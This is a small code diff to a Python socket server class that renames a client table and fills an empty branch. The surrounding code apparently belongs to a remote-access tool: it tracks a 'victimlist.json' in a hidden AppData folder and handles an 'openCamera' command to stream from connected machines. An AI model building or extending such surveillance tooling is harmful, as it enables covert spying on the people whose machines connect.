@@ -9,7 +9,7 @@ class MySocket:
             self.__host = host
             self.__tcpPort = tcpPort
             self.__udpPort = udpPort
-            self.__client = {}
+            self.clients = {}
 
             self.testPath =  "./data/victimlist.json"
             self.__rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
@@ -25,7 +25,7 @@ class MySocket:
             try:
                 data = clientSocket.recv(4096).decode()
                 data = json.load(data)
-                self.__client[address] = {  "UID":data["UID"],
+                self.clients[address] = {  "UID":data["UID"],
                                             "client_socket":clientSocket
                                         }
                 
@@ -54,7 +54,7 @@ class MySocket:
                 clientScocket,addr = self.udpServer.recvfrom(4096)
         
         def send(self,address,message):
-            client = self.__client.get(address)
+            client = self.clients.get(address)
             if client:
                 client["client_socket"].send(message.encode())
 
@@ -84,7 +84,7 @@ class MySocket:
                 if(command["openCamera"] == True):
                     self.UDPsend()
                 elif(command["openCamera"] == False):
-                    
+                    pass
 
 
         def UDPsend(self):
